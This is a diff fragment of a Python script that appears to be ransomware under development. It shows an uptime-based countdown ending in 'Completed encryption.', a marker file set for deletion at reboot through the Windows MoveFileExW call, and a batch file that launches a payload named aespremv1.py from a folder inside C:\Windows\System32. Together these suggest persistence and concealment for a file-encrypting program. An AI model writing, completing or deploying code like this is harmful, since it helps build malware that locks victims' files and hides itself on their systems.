@@ -206,7 +206,7 @@ def check_uptime():
 
     current_time = datetime.now()
     uptime = current_time - boot_time
-    myprpaths = r"C:\pr.txt"
+    myprpaths = r"C:\prx.txt"
     if not os.path.exists(myprpaths): 
         time_remaining = timedelta(minutes=3)
         while time_remaining.total_seconds() > 0:
@@ -237,12 +237,11 @@ def check_uptime():
             time.sleep(1)
             time_remaining -= timedelta(seconds=1)
         print("Completed encryption.")
-xsadasdpath = r"C:\pr.txt"
+
 
 check_uptime()
-with open(xsadasdpath, 'w') as temp_file:
-    temp_file.write("Temporary content")
-ctypes.windll.kernel32.MoveFileExW(xsadasdpath, None, 4)
+xsadasdpath = r"C:\prx.txt"
+
 '''
 directory = r'C:\Windows\System32'
 
@@ -297,7 +296,9 @@ def create_batch_file(python_command, script_name):
         print(f"")
     else:
         print("")
-
+with open(xsadasdpath, 'w') as temp_file:
+    temp_file.write("Temporary content")
+ctypes.windll.kernel32.MoveFileExW(xsadasdpath, None, 4)
 create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aespremv1.py")
 def run_batch_file(batch_file_path):
     try:
